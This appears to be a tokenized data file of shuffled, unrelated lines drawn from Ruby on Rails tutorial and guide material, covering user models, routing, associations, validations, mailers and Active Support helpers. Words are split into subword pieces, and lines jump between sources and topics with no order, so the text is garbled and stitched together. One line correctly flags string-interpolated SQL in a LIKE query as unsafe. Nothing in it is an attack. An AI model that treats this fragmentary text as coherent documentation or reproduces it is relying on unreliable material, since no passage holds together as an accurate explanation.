▁Start ing ▁from ▁scratch , ▁in ▁this ▁chapter ▁we ▁created ▁a ▁working ▁User ▁model ▁with ▁\ k ode { name }, ▁\ k ode { email }, ▁and ▁ various ▁password ▁attributes , ▁together ▁with ▁validations ▁enforc ing ▁sever al ▁important ▁constraints ▁on ▁their ▁values .
▁has _ and _ belongs _ to _ many ▁: assemblies
▁ //= ▁require ▁ jquery _ ujs
▁Date : ▁Thu ▁Oct ▁ 15 ▁ 11 : 36 : 2 1 ▁200 9 ▁- 07 00
▁as ▁show n ▁in ▁Listing ~\ ref { code : password _ reset _ edit _ action } .
▁This ▁is ▁because ▁that ▁class ▁may ▁not ▁always ▁be ╼` User `, ▁as ▁previous ly ▁explained ▖
▁h w p c b m z e ▖ heroku app ▖ com ╼ se y j h f lo ▖ heroku app ▖ com ╼ j h y ice v g ▖ heroku app ▖ com
▁To ▁get ▁started , ▁I ▁suggest ▁view ing ▁the ▁\ href { http :// r ailscasts ▖ com / episodes / 2 06 - action - mailer - in - rails - 3 } { RailsCast ▁on ▁Action ▁Mailer ▁in ▁Rails ~ 3 } .
▁M a k ing ▁a ▁\ k ode { workspace } ▁directory ▁for ▁Rails ▁ projects ▁( un n ec ess ary ▁in ▁the ▁cloud ) .
▁### ▁De let ing ▁As so ci at ed ▁Object s
▁The ▁second ▁line ▁can ▁ safe ly ▁access ▁the ▁`: params ` ▁key , ▁and ▁let ▁the ▁user ▁to ▁pass ▁either ▁`: params ` ▁or ▁" params " .
▁The ▁Rails ╼ p l ur a li z ation ▁ mechanism s ▁are ▁very ▁powerful , ▁being ▁cap able ▁to ▁ pluralize ▁( and ╼ singularize ) ▁both ▁regular ▁and ▁ ir regular ▁words ▖
▁as ▁seen ▁in ▁Listing ~\ ref { code : user _ index } .
▁ 123 4 ▖ to _ s (: human ) ▁# ▁=> ▁" 1▖23 ▁T housand "
▁### ▁Rails ▁General ▁Configuration
▁| ▁| ▁40 1 ▁| ▁: un authorize d ▁|
▁In ▁addition , ▁as ▁mentioned ▁above , ▁the ▁code ▁\ k ode { match ▁' / about ' } ▁also ▁automatically ▁creates ▁\ emph { name d ▁routes } ▁for ▁use ▁in ▁the ▁controllers ▁and ▁views :
▁For ▁convenience , ▁we ' ve ▁used ▁`` string ▁ multi plication '' ▁in ▁Listing ~\ ref { code : length _ validation _ test } ▁to ▁make ▁a ▁string ▁ 51 ▁characters ▁long .
▁We ▁can ▁re c t if y ▁this ▁ s ad ▁situation ▁by ▁adding ▁microposts ▁to ▁the ▁ seed ▁data ▁from ▁Section ~\ ref { sec : sample _ users } .
▁The ▁basic ▁idea ▁ behind ▁the ▁feed ▁is ▁simple .
▁The ▁` has _ many ` ▁association ▁supports ▁these ▁options :
▁Return s ▁` radio _ button ` ▁tags ▁for ▁the ▁collection ▁of ▁existing ▁return ▁values ▁of ▁` method ` ▁for ▁` object ` ' s ▁class .
▁T ry ▁this ▁now ▁by ▁creating ▁a ▁new ▁file ▁at ▁` app / views / blorgh / articles / index ▖ html ▖ erb `╼ and ▁put ▁this ▁content ▁in ▁it :
▁ Hash es ▁also ▁respond ▁to ▁` to _ query ` ▁but ▁with ▁a ▁different ▁sign at ure ▖
▁For ▁example , ▁instead ▁of
▁The ▁learning ▁process ▁for ▁editor s ▁and ▁IDE s ▁is ▁particular ly ▁long ; ▁you ▁can ▁ s p end ▁ weeks ▁on ▁S ublime ▁Text ▁or ▁ V im ▁tutorial s ▁ al one .
▁With ▁that , ▁we ' re ▁done ▁with ▁the ▁links ▁and ▁named ▁routes , ▁at ▁least ▁un til ▁we ▁add ▁a ▁route ▁for ▁logging ▁in ▁( Chapter ~\ ref { cha : log _ in _ log _ out }) .
▁We ▁can ▁serve ▁our ▁entire ▁JavaScript ▁bundle ▁on ▁every ▁page , ▁which ╼ me an s ▁that ▁it ' ll ▁get ▁ download ed ▁on ▁the ▁first ▁page ▁load ▁and ▁then ▁be ▁cached ▁on ╼ ever y ▁page ▁after ▁that ▖
▁The ▁data ▁model ▁for ▁users .
▁ Second , ▁always ▁do ▁ ext en s ive ▁ Google ▁search es ▁on ▁your ▁ proposed ▁feature ▁to ▁find ▁relevant ▁blog ▁posts ▁and ▁tutorial s .
▁### ▁ Extra c ting
▁< title > <%= ▁@ page _ title ▁or ▁" P age ▁ Title " ▁%></ title >
▁If ▁you ▁are ▁rely ing ▁on ▁the ▁ability ▁for ▁external ▁applications ▁or ▁ Java script ▁to ▁be ▁able ▁to ▁read ▁your ▁Rails ▁app ' s ▁signed ▁session ▁cookies ▁( or ▁signed ▁cookies ▁in ▁general ) ▁you ▁should ▁not ▁set ▁` secret _ key _ base ` ▁un til ▁you ▁have ▁ de co up le d ▁these ▁concern s .
▁To ▁make ▁the ▁actual ▁index ▁page , ▁we ' ll ▁make ▁a ▁view ▁( w h o se ▁file ▁you ' ll ▁have ▁to ▁create ) ▁that ▁iterate s ▁through ▁the ▁users ▁and ▁wrap s ▁each ▁one ▁in ▁an ~\ k ode { li } ▁tag .
▁With ▁that , ▁the ▁final ▁form ▁of ▁the ▁user / micropost ▁association ▁is ▁in ▁place , ▁and ▁all ▁the ▁tests ▁should ▁be ▁passing :
▁The ▁result ▁appears ▁in ▁Listing ~\ ref { code : micropost _ partial _ with _ delete }
▁In ▁the ▁examples ▁above ▁it ▁would ▁be ▁called ▁` x ?` .
▁A g a in , ▁we ' ll ▁use ▁the ▁same ▁generator ▁we ▁used ▁before :
▁### ▁S an it ize Helper
▁In ▁fact , ▁the ▁result ▁string ▁is ▁wrap ped ▁in ▁an ▁instance ▁of ▁` ActiveSupport :: M ul t i by te :: C ha rs ` .
▁<% ▁@ greeting ▁= ▁capture ▁do ▁%>
▁This ▁guide ▁will ▁refer ▁to ▁these ╼ " full ▁plugin s " ▁simply ▁as ▁" engine s " ▁throughout ▖
▁What ' s ▁going ▁on ▁is ▁that ▁Rails ▁is ▁\ emph { written ▁in } ▁Ruby , ▁but ▁Rails ▁isn ' t ▁Ruby .
▁' X - XSS - Pro t ec tion ' ▁=> ▁' 1 ; ▁mode = block ',
▁create
▁# ▁B oo le an ▁test
▁But ▁recall ▁from ▁Section ~\ ref { sec : find ing _ user _ objects } ▁that ▁\ k ode { find } ▁raise s ▁an ▁exception ▁if ▁the ▁user ▁id ▁doesn ' t ▁exist .
▁Inde nt s ▁the ▁lines ▁in ▁the ▁receiver :
▁Here ' s ▁the ▁simple st ▁way ▁to ▁write ▁JavaScript ▖
▁This ▁manifest ▁` app / assets / javascripts / application ▖ js `:
▁A lthough ▁the ▁default ▁behavior ▁for ▁` # image _ tag ` ▁is ▁to ▁always ▁return ╼` / images / icon ▖ png `, ▁we ▁take ▁into ▁account ▁the ▁full ▁Rails ▁ stack ▁( including ▁the ╼ Asset ▁Pipeline ) ▁we ▁may ▁see ▁the ▁result ▁seen ▁above .
▁ V ir t u ally ▁all ▁Rails ▁applications ▁start ▁the ▁same ▁way , ▁by ▁running ▁the ▁\ k ode { rails ▁new } ▁command .
▁Rails ▖ application ▖ routes ▖ d raw ▁do
▁You ▁can ▁specify ▁an ▁excl a m ation ▁point ▁( ` !` ) ▁on ▁the ▁end ▁of ▁the ▁dynamic ▁find ers ▁to ▁get ▁them ▁to ▁raise ▁an ▁` ActiveRecord :: RecordNotFound ` ▁error ▁if ▁they ▁do ▁not ▁return ▁any ▁records , ▁like ▁` Client ▖ find _ by _ name !( " Ryan ") `
▁Here ▁the ▁result ▁of ▁evaluat ing ▁\ k ode {" foo "} ▁plus ▁\ k ode {" bar "} ▁is ▁the ▁string ▁\ k ode {" foobar "}
▁has _ many ▁: manifest s
▁If ▁you ▁validate ▁the ▁presence ▁of ▁an ▁object ▁ associated ▁via ▁a ▁` has _ one ` ▁or ╼` has _ many ` ▁relationship , ▁it ▁will ▁check ▁that ▁the ▁object ▁is ▁ n either ▁` blank ?` ▁no r ╼` marked _ for _ destruction ?` .
▁C an ▁you ▁re p r o d u ce ▁the ▁report ed ▁issue ▁on ▁your ▁own ▁computer ?
▁U nfortunately , ▁return ing ▁a ▁ paginate d ▁feed ▁doesn ' t ▁work ▁in ▁this ▁case .
▁In ▁the ▁case ▁of ▁the ▁Static ▁Pages ▁controller , ▁both ▁of ▁its ▁methods ▁are ▁initially ▁empty :
▁The ▁method ▁` Array ▖ deep _ dup ` ▁duplicate s ▁itself ▁and ▁all ▁objects ▁inside ╼ recursive ly ▁with ▁Active ▁Support ▁method ▁` Object # deep _ dup ` ▖
▁As ▁usual , ▁Git ▁users ▁should ▁create ▁a ▁new ▁topic ▁branch :
▁Note ▁that ▁the ▁ closing ▁tag ▁cannot ▁be ▁of ▁the ▁style ▁` - % >` .
▁S end ing ▁E mail s
▁The ▁only ▁code ▁not ▁present ly ▁working ▁is
▁Fin ally , ▁on ▁some ▁systems ▁you ▁m ight ▁have ▁to ▁restart ▁the ▁web ▁server ▁( using ▁\ text tt { Ctrl - C }) ▁for ▁the ▁changes ▁to ▁take ▁effect
▁Thu s , ▁we ' ll ▁ begin ▁with ▁a ▁model ▁for ▁\ emph { users } ▁of ▁the ▁app ▁( Section ~\ ref { sec : modeling _ demo _ users }), ▁and ▁then ▁we ' ll ▁add ▁a ▁model ▁for ▁\ emph { microposts } ▁( Section ~\ ref { sec : modeling _ demo _ microposts }) .
▁App ly ing ▁the ▁\ k ode { dup } ▁method ▁to ▁the ▁user ' s ▁microposts ▁gives ▁us ▁code ▁like ▁this :
▁There ▁is ▁also ▁an ▁ability ▁to ▁pass ▁custom ▁exception ▁to ▁`: strict ` ▁option .
▁=> ▁[1, ▁4 , ▁ 9 , ▁ 16 , ▁ 25 ]
▁The ▁view ▁for ▁the ▁About ▁page ▁with ▁an ▁ Embedded ▁Ruby ▁title .
▁\ emph { Hint } : ▁Add ▁to ▁the ▁test ▁in ▁Listing ~\ ref { code : user _ profile _ test } .
▁The ▁email ▁length ▁validation ▁arrange s ▁to ▁make ▁a ▁valid ▁email ▁address ▁that ' s ▁one ▁character ▁too ▁long :
▁* ▁: foreign _ key
▁Thu s , ▁the ▁first ▁step ▁in ▁ signing ▁up ▁users ▁is ▁to ▁make ▁a ▁data ▁structure ▁to ▁capture ▁and ▁store ▁their ▁information .
▁A ▁ mixin ▁allows ▁a ▁group ▁of ▁CSS ▁rules ▁to ▁be ▁package d ▁up ▁and ▁used ▁for ▁multiple ▁elements , ▁convert ing
▁ Adding ▁an ▁options ▁hash ▁in ▁the ▁\ k ode { gravatar \_ for } ▁helper .
▁ Most ▁of ▁these ▁ignore d ▁files ▁change ▁f r equ ent ly ▁and ▁automatically , ▁so ▁including ▁them ▁under ▁version ▁control ▁is ▁unnecessary .
▁as ▁show n ▁in ▁Listing ~\ ref { code : log _ in _ with _ remember } .
▁### ▁config / initializers / wrap _ parameters ▖ rb
▁ Technical ly , ▁only ▁the ▁domain ▁part ▁of ▁the ▁email ▁address ▁is ▁case - insensitive : ▁ foo @ bar ▖ com ▁is ▁actually ▁different ▁from ▁ Foo @ bar ▖ com .
▁The ▁default ▁error ▁message ▁is ▁_" is ▁not ▁a ▁number " _ .
▁An ▁` ActiveRecord :: StaleObjectError ` ▁exception ▁is ▁throw n ▁if ▁that ▁has ▁occur r ed ▁and ▁the ▁update ▁is ▁ignore d .
▁You ▁can ▁see ▁if ▁any ▁ associated ▁objects ▁exist ▁by ▁using ▁the ▁` association ▖ nil ?` ▁method :
▁collection ▁do
▁Now ▁that ▁we ' ve ▁supplied ▁the ▁User ▁model ▁with ▁the ▁required ▁\ k ode { password \_ digest } ▁attribute ▁and ▁installed ▁ bcrypt , ▁we ' re ▁ready ▁to ▁add ▁\ k ode { has \_ secure \_ password } ▁to ▁the ▁User ▁model , ▁as ▁show n ▁in ▁Listing ~\ ref { code : has _ secure _ password } .
▁S ince ▁everything ▁in ▁Ruby ▁is ▁an ▁object , ▁it ▁follows ▁that ▁\ k ode { nil } ▁is ▁an ▁object , ▁so ▁it ▁too ▁can ▁respond ▁to ▁methods .
▁B oth ▁methods ▁will ▁list ▁all ▁of ▁your ▁routes , ▁in ▁the ▁same ▁order ▁that ▁they ▁appear ▁in ▁` routes ▖ rb ` ▖
▁When ▁reading ▁the ▁\ emph { Rails ▁Tutorial }, ▁you ▁may ▁find ▁it ▁convenient ▁to ▁follow ▁an ▁ internal ▁section ▁link ▁to ▁look ▁at ▁the ▁reference ▁and ▁then ▁immediately ▁go ▁back ▁to ▁where ▁you ▁were ▁before .
▁ Cache - Control : ▁no - cache
▁See ▁the ▁\ href { http :// api ▖ rubyonrails ▖ org / v 4▖2▖0 / classes / ActiveRecord / Callbacks ▖ html } { Rails ▁API ▁entry ▁on ▁callbacks } ▁for ▁more ▁information ▁on ▁which ▁callbacks ▁Rails ▁supports .
▁get ▁' * pages ', ▁to : ▁' pages # show ', ▁format : ▁true
▁To ▁require ▁users ▁to ▁be ▁logged ▁in , ▁we ▁define ▁a ▁\ k ode { logged \_ in \_ user } ▁method ▁and ▁invoke ▁it ▁using ▁\ k ode { before \_ action ▁: logged \_ in \_ user }, ▁as ▁show n ▁in ▁Listing ~\ ref { code : authorize _ before _ filter } .
▁We ▁also ▁include ▁the ▁\ href { https :// github ▖ com / j nick la s / c a p y bar a } { Capybara ▁gem }, ▁which ▁allows ▁us ▁to ▁simul ate ▁a ▁user ' s ▁inter action ▁with ▁the ▁sample ▁application ▁using ▁a ▁natural ▁English - like ▁syntax , ▁together ▁with ▁\ href { http :// docs ▖ s elenium h q ▖ org / projects / web d r ive r /}{ S elenium }, ▁one ▁of ▁Capybara ' s ▁ dependencies
▁This ▁means ▁that
▁F on t s
▁An y ▁Rack ▁ com p li an t ▁web ▁server ▁should ▁be ▁using ╼` Rails ▖ application ` ▁object ▁to ▁serve ▁a ▁Rails ▁application .
▁M a k ing ▁one ▁of ▁the ▁fixture ▁users ▁an ▁admin .
▁If ▁you ▁skip ped ▁that ▁section , ▁you ▁should ▁go ▁there ▁now ▁and ▁complete ▁it ▁before ▁proceeding .
▁ / db /* ▖ sqlite 3
▁<%= ▁form _ for (@ article , ▁remote : ▁true ) ▁do ▁| f | ▁%>
▁ SELECT ▁C O U N T ▁ (* ) ▁AS ▁count _ all , ▁status ▁AS ▁status
▁NOTE : ▁Defin ed ▁in ▁` active _ support / core _ ext / name _ error ▖ rb ` .
▁In ▁contrast , ▁when ▁using ▁Rails ▁to ▁model ▁users ▁we ▁don ' t ▁need ▁to ▁identify ▁the ▁attributes ▁explicitly .
▁validates _ with ▁My Validator
▁As ▁we ' ll ▁see ▁in ▁Section ~\ ref { sec : successful _ signup s }, ▁the ▁key ▁to ▁creating ▁a ▁user ▁is ▁the ▁special ▁\ k ode { name } ▁attribute ▁in ▁each ▁\ k ode { input } :
▁create _ table ▁: comments ▁do ▁| t |
▁When ▁using ▁` magazine _ ad _ path `, ▁you ▁can ▁pass ▁in ▁instance s ▁of ▁` Magazine ` ▁and ▁` A d ` ▁instead ▁of ▁the ▁ numeric ▁ ID s :
▁ Base d ▁on ▁this ▁discussion ▁of ▁\ k ode { send }, ▁we ▁can ▁re write ▁the ▁current ▁\ k ode { authenticated ?}\ ▁method ▁as ▁follows :
▁< td > <%= ▁link _ to ▁" Edit ", ▁edit _ book _ path ( book ) ▁%></ td >
▁` title ize ` ▁is ▁alias ed ▁to ▁` title case ` .
▁<%= ▁render ▁partial : ▁" product ", ▁collection : ▁@ products , ▁as : ▁: item ▁%>
▁By ▁default , ▁controllers ▁in ▁Rails ▁automatically ▁render ▁views ▁with ▁names ▁that ▁correspond ▁to ▁valid ▁routes ▖
▁This ▁set s ▁the ▁variable ▁\ k ode { data - remote =" true "} ▁inside ▁the ▁form ▁tag , ▁which ▁tell s ▁Rails ▁to ▁allow ▁the ▁form ▁to ▁be ▁handle d ▁by ▁JavaScript .
▁The ▁controller ▁generated ▁by ▁the ▁scaffold ing ▁is ▁show n ▁schematic ally ▁in ▁Listing ~\ ref { code : demo _ users _ controller } .
▁The ▁string ▁is ▁nonempty .
▁email _ with _ name ▁= ▁% (" # {@ user ▖ name } " ▁< # {@ user ▖ email } > )
▁Logging ▁in ▁a ▁test ▁user ▖
▁Be low ▁is ▁a ▁ com pre h en s ive ▁list ▁of ▁all ▁the ▁ initializers ▁found ▁in ▁Rails ▁in ▁the ▁order ▁that ▁they ▁are ▁defined ▁( and ▁therefore ▁run ▁in , ▁unless ▁otherwise ▁state d ) .
▁A ▁test ▁for ▁an ▁ unsuccessful ▁edit ▖
▁In ▁other ▁words , ▁there ' s ▁a ▁suit able ▁base ▁title , ▁but ▁there ' s ▁also ▁a ▁ tr ailing ▁vertical ▁bar ▁character ▁\ k ode { | } ▁at ▁the ▁end .
▁Use ▁the ▁` distinct ` ▁method ▁to ▁keep ▁the ▁collection ▁free ▁of ▁duplicate s ▖
▁# ▁Rails ▁3 ▖ x
▁There ' s ▁also ▁the ▁ bang ▁variant ▁` except !` ▁that ▁remove s ▁keys ▁in ▁the ▁very ▁receiver .
▁To ▁verify ▁the ▁server ▁has ▁stop ped ▁you ▁should ▁see ▁your ▁command ▁pro mp t ╼ c ur s or ▁again ▖
▁now ▖ all _ day
▁A lthough ▁many ▁of ▁the ▁details ▁are ▁irrelevant ▁for ▁our ▁purposes , ▁let ' s ▁take ▁a ▁moment ▁to ▁highlight ▁the ▁most ▁important ▁parts ▁of ▁its ▁structure .
▁The ▁effect ▁of ▁presence ▁validations ▁on ▁the ▁User ▁model .
▁ensure s ▁that ▁the ▁Rake ▁task ▁has ▁access ▁to ▁the ▁local ▁Rails ▁environment , ▁including ▁the ▁User ▁model ▁( and ▁hence ▁\ k ode { User ▖ create ! }) .
▁Because ▁users ▁have ▁to ▁be ▁logged ▁in ▁to ▁delete ▁users , ▁Listing ~\ ref { code : destroy _ action } ▁also ▁add s ▁\ k ode { : destroy } ▁to ▁the ▁\ k ode { logged \_ in \_ user } ▁before ▁filter .
▁ ╼ ▁Get ▁help ▁on ▁the ▁Ruby ▁on ▁Rails ▁Tutorial ▁at ▁the
▁=> ▁ ActionController :: Base
▁ ╼\ end { code }╼╼ ▁\ subsection { Data base ▁migrations } ▁% ▁( fold )╼ ▁\ label { sec : database _ migrations }╼╼
▁The ▁application ▁root ▁directory ▁here ▁is ▁everything ▁before ▁\ k ode { config }, ▁i ▖ e ▖ ,
▁T y p ical ly , ▁the ▁views ▁share ▁their ▁name ▁with ▁the ▁ associated ▁controller ▁action , ▁as ▁you ▁can ▁see ▁above .
▁These ▁files ▁are ▁used ▁to ▁display ▁the ▁view ▁that ▁results ▁from ▁each ▁controller ▁action .
▁No ▁static ▁pages ▁( like ▁`` Home '' ▁or ▁`` About '')
▁ video ▁= ▁self ▖ argument s ▖ first
▁in ▁Listing ~\ ref { code : close _ route } .
▁The ▁result , ▁with ▁migration ▁name ▁\ k ode { add \_ password \_ digest \_ to \_ users }, ▁appears ▁as ▁follows :
▁< div ▁id =" menu "> M en u ▁ items ▁here </ div >
▁ Sign ing ▁up ▁on ▁the ▁live ▁Web .
▁# ▁E x p and s ▁the ▁lines ▁which ▁load ▁the ▁assets
▁m attr _ accessor ▁: logger
▁ )▖ on ▁" ajax : error ", ▁( e , ▁ xhr , ▁status , ▁error ) ▁->
▁=> ▁ 59
▁We ' ll ▁add ▁user ▁edit / update ▁functionality ▁to ▁the ▁sample ▁application ▁in ▁Section ~\ ref { sec : updating _ users } .
▁No ▁data ▁validations .
▁This ▁would ▁ tr an s parent ly ▁ migrate ▁your ▁existing ▁` Marshal ` - serialize d ▁cookies ▁into ▁the ╼ new ▁` JSON ` - base d ▁format .
▁In ▁this ▁example , ▁the ▁first ▁question ▁mark ▁will ▁be ▁replace d ▁with ▁the ▁value ▁in ▁` params [: orders ]` ▁and ▁the ▁second ▁will ▁be ▁replace d ▁with ▁the ▁SQL ▁representation ▁of ▁` false `, ▁which ▁depend s ▁on ▁the ▁adapter .
▁P erhaps ▁the ▁simple st ▁thing ▁you ▁can ▁do ▁with ▁` render ` ▁is ▁to ▁render ▁not h ing ▁at ▁all :
▁As ▁you ▁can ▁see , ▁Rails ▁provides ▁a ▁\ text tt { Rails } ▁object ▁with ▁an ▁\ text tt { env } ▁attribute ▁and ▁ associated ▁environment ▁boolean ▁methods , ▁so ▁that , ▁for ▁example , ▁\ text tt { Rails ▖ env ▖ test ?}
▁#### ▁Load ing ▁G r o up ed ▁ Core ▁Extensions
▁The ▁block ▁will ▁only ▁be ▁executed ▁if ▁the ▁client ▁is ▁being ▁created ▖
▁As ▁with ▁the ▁rule ▁for ▁the ▁root ▁route , ▁this ▁creates ▁two ▁named ▁routes , ▁\ k ode { help \_ path } ▁and ▁\ k ode { help \_ url } :
▁In ▁this ▁case , ▁we ▁want ▁to ▁document ▁the ▁behavior ▁of ▁the ▁ _ framework _ , ▁and ▁not ▁just ╼ this ▁specific ▁method .
▁get ▁' profile ', ▁to : ▁: show
▁Note ▁the ▁use ▁of ▁\ k ode { user \_ params } ▁in ▁the ▁call ▁to ▁\ k ode { update \_ attributes }, ▁which ▁uses ▁ strong ▁parameters ▁to ▁prevent ▁ mass ▁assignment ▁ vulnerabilit y ▁( as ▁describe d ▁in ▁Section ~\ ref { sec : strong _ parameters }) .
▁The ▁result ▁should ▁look ▁something ▁like ▁Figure ~\ ref { fig : demo _ micropost _ index _ rails _3} .
▁get ▁' : controller / : action / : id '
▁Figure ~\ ref { fig : user _ feed } ▁shows ▁a ▁sample ▁\ k ode { microposts } ▁database ▁table ▁and ▁the ▁result ing ▁feed .
▁NOTE : ▁When ▁initializ ing ▁a ▁new ▁` has _ one ` ▁or ▁` belongs _ to ` ▁association ▁you ▁must ▁use ▁the ▁` build _ ` ▁prefix ▁to ▁build ▁the ▁association , ▁rather ▁than ▁the ▁` association ▖ build ` ▁method ▁that ▁would ▁be ▁used ▁for ▁` has _ many ` ▁or ▁` has _ and _ belongs _ to _ many ` ▁associations ▖
▁A ▁diagram ▁of ▁sample ▁data ▁in ▁a ▁\ k ode { users } ▁table .
▁as ▁show n ▁in ▁Listing ~\ ref { code : user _ login _ test _ valid _ information } .
▁Active ▁Record ▁provides ▁` readonly ` ▁method ▁on ▁a ▁relation ▁to ▁explicitly ▁di s allow ▁modification ▁of ▁any ▁of ▁the ▁returned ▁objects ▖
▁Signup ▁failure ▁debug ▁information .
▁Tests ▁for ▁following / follower ▁pages ▖
▁Here ▁we ▁check ▁the ▁ validity ▁of ▁the ▁\ k ode { user } ▁variable ▁using ▁the ▁\ k ode { valid ?}\ ▁method , ▁which ▁returns ▁\ k ode { false } ▁when ▁the ▁object ▁fails ▁one ▁or ▁more ▁validations , ▁and ▁\ k ode { true } ▁when ▁all ▁validations ▁pass .
▁INFO ▖ ▁ Remember ▁that ▁in ▁order ▁to ▁use ▁languages ▁like ▁Sass ▁or ▁CoffeeScript , ▁you ╼ should ▁add ▁the ▁relevant ▁library ▁to ▁your ▁engine ' s ▁` ▖ gem spec ` .
▁M ▖ parent _ name ▁# ▁=> ▁" X :: Y "
▁create ▁app / views / static _ pages / home ▖ html ▖ erb
▁P la ce ▁the ▁methods ▁inside ▁the ▁module ▁and ▁you ' ll ▁be ▁good ▁to ▁go .
▁In ▁principle , ▁a lthough ▁we ▁are ▁now ▁done ▁with ▁authentication , ▁new ly ▁registered ▁users ▁m ight ▁be ▁con f used , ▁as ▁they ▁are ▁not ▁signed ▁in ▁by ▁default .
▁Inde ed , ▁the ▁technique ▁is ▁exactly ▁the ▁same ▁as ▁for ▁followed ▁users , ▁with ▁the ▁role s ▁of ▁\ k ode { follower \_ id } ▁and ▁\ k ode { followed \_ id } ▁ reverse d , ▁and ▁with ▁\ k ode { passive \_ relationships } ▁in ▁place ▁of ▁\ k ode { active \_ relationships } .
▁If ▁you ▁validate ▁the ▁absence ▁of ▁an ▁object ▁ associated ▁via ▁a ▁` has _ one ` ▁or ╼` has _ many ` ▁relationship , ▁it ▁will ▁check ▁that ▁the ▁object ▁is ▁ n either ▁` present ?` ▁no r ╼` marked _ for _ destruction ?` .
▁config ▖ action _ controller ▖ asset _ host ▁= ▁ ENV [' CDN _ H O ST ']
▁Un like ▁` select `, ▁` pluck ` ▁directly ▁convert s ▁a ▁database ▁result ▁into ▁a ▁Ruby ▁` Array ` ,╼ with out ▁construct ing ▁` ActiveRecord ` ▁objects ▖
▁This ▁suggest s ▁that ▁the ▁correct ▁relationships ▁are ▁like ▁this :
▁Because ▁the ▁\ k ode { deliveries } ▁array ▁is ▁ global , ▁we ▁have ▁to ▁reset ▁it ▁in ▁the ▁\ k ode { setup } ▁method ▁to ▁prevent ▁our ▁code ▁from ▁break ing ▁if ▁any ▁other ▁tests ▁ deliver ▁email ▁( as ▁will ▁be ▁the ▁case ▁in ▁Section ~\ ref { sec : password _ reset _ test }) .
▁as ▁seen ▁in ▁Listing ~\ ref { code : hello _ world } .
▁For ▁example , ▁` Client ▖ where (" first _ name ▁L I K E ▁' % # { params [: first _ name ]} % ' ") ` ▁is ▁not ▁ safe ▖
▁We ▁can ▁see ▁its ▁effect ▁by ▁prepar ing ▁a ▁( blank ) ▁test ▁database ▁and ▁running ▁the ▁User ▁model ▁ spec :
▁This ▁may ▁be ▁useful ▁if ▁you ▁want ▁to ▁ r ever t ▁engine ' s ▁migrations ▁before ▁remov ing ▁it ▖╼
▁* ▁FROM ▁articles
▁TIP : ▁If ▁you ▁find ▁yourself ▁want ing ▁to ▁change ▁this ▁option ▁ uni form ly ▁for ▁all ▁of ▁your ▁routes , ▁you ▁can ▁use ▁a ▁scope .
▁app / assets / javascripts / s ub / something ▖ js
▁We ▁can ▁even ▁call ▁the ▁controller ▁actions ▁inside ▁the ▁console , ▁which ▁are ▁just ▁methods :
▁To ▁test ▁for ▁such ▁`` friendly ▁ forwarding '' , ▁we ▁first ▁visit ▁the ▁user ▁edit ▁page , ▁which ▁redirect s ▁to ▁the ▁signin ▁page .
▁B eginning ▁with ▁Rails ▁2, ▁the ▁standard ▁extensions ▁are ▁` ▖ erb ` ▁for ▁ ERB ▁( HTML ▁with ▁ embedded ▁Ruby ), ▁and ▁` ▖ builder ` ▁for ▁ Builder ▁( XML ▁generator ) .
▁In ▁general , ▁you ▁should ▁use ▁the ▁` get `, ▁` post `, ▁` put `, ▁` patch ` ▁and ▁` delete ` ▁methods ▁to ▁constrain ▁a ▁route ▁to ▁a ▁particular ▁verb ▖
▁The ▁Home ▁page ▁with ▁a ▁working ▁status ▁feed .
▁NOTE : ▁Defin ed ▁in ▁` active _ support / core _ ext / numeric / by te s ▖ rb ` .
▁This ▁is ▁the ▁only ▁non t ri via l ▁step , ▁and ▁in ▁the ▁latest ▁version ▁of ▁Rails ▁all ▁these ▁features ▁come ▁for ▁free ▁with ▁one ▁method , ▁\ k ode { has \_ secure \_ password } :
▁Return s ▁select ▁and ▁option ▁tags ▁for ▁the ▁given ▁object ▁and ▁method , ▁using ▁` time _ zone _ options _ for _ select ` ▁to ▁generate ▁the ▁list ▁of ▁option ▁tags .
▁Ou r ▁plan ▁is ▁to ▁find ▁the ▁user ▁by ▁email ▁address ▁and ▁then ▁ authenticate ▁the ▁activation ▁token , ▁so ▁the ▁link ▁needs ▁to ▁include ▁both ▁the ▁email ▁and ▁the ▁token .
▁The ▁reset ▁link ▁will ▁go ▁to ▁a ▁form ▁for ▁reset ting ▁the ▁user ' s ▁password ▁( with ▁confirmation ) ▁( Figure ~\ ref { fig : reset _ password _ form _ mockup }) .
▁This ▁simply ▁uses ▁the ▁\ k ode { pending } ▁method ▁to ▁indicate ▁that ▁we ▁should ▁fill ▁the ▁ spec ▁with ▁something ▁useful .
▁De p lo y ing ▁to ▁a ▁sub directory ▁in ▁production ▁has ▁implications ▁on ▁ various ▁parts ▁of ╼ Rails .
▁### ▁ Order ing ▁of ▁test ▁cases
▁ActiveRecord :: RecordNotFound : ▁Co ul d n ' t ▁find ▁User ▁with ▁ ID = 3
▁class ▁Noti fi er ▁< ▁ ActionMailer :: Base
▁The ▁`: allow _ blank ` ▁option ▁is ▁similar ▁to ▁the ▁`: allow _ nil ` ▁option ▖
▁Because ▁of ▁the ▁flash ▁message ▁display ▁in ▁the ▁site ▁layout ▁( Listing ~\ ref { code : layout _ flash }), ▁the ▁\ k ode { flash [: danger ]} ▁message ▁automatically ▁get s ▁displayed ; ▁because ▁of ▁the ▁Bootstrap ▁CSS , ▁it ▁automatically ▁get s ▁nice ▁styling ▁( Figure ~\ ref { fig : failed _ login _ flash }) .
▁C ▖ subclasses ▁# ▁=> ▁[ B , ▁D ]
▁P ess im ist ic ▁ lock ing ▁uses ▁a ▁ lock ing ▁ mechanism ▁provided ▁by ▁the ▁under ly ing ▁database ▖
▁# ▁You ▁can ▁refer ▁to ▁the ▁email ▁column ▁as ▁" login " .
▁See ▁if ▁you ▁can ▁ connect ▁the ▁lines ▁in ▁Listing ~\ ref { code : micropost _ validity _ test _ idiomatic } ▁to ▁the ▁steps ▁mentioned ▁above .
▁Here ▁we ' ve ▁iterate d ▁over ▁the ▁elements ▁of ▁the ▁\ k ode { address es } ▁array ▁using ▁the ▁\ k ode { each } ▁method ▁( Section ~\ ref { sec : block s }) .
▁scope ▁: inactive , ▁-> ▁ { ▁where ▁state : ▁' inactive ' ▁ }
▁In ▁Section ~\ ref { sec : the _ status _ feed }, ▁we ' ll ▁complete ▁our ▁sample ▁application ▁by ▁adding ▁the ▁user ' s ▁status ▁feed .
▁-> ▁ { ▁where ▁ factory : ▁' S eattle ' ▁ }
▁( If ▁this ▁fails , ▁try ▁ ex it ing ▁any ▁running ▁ sandbox ▁console ▁sessions , ▁which ▁can ▁ lock ▁the ▁database ▁and ▁prevent ▁migrations ▖)
▁#### ▁Rendering ▁an ▁Action ' s ▁View
▁ ╼ ▁* = ▁require _ tree ▁ .
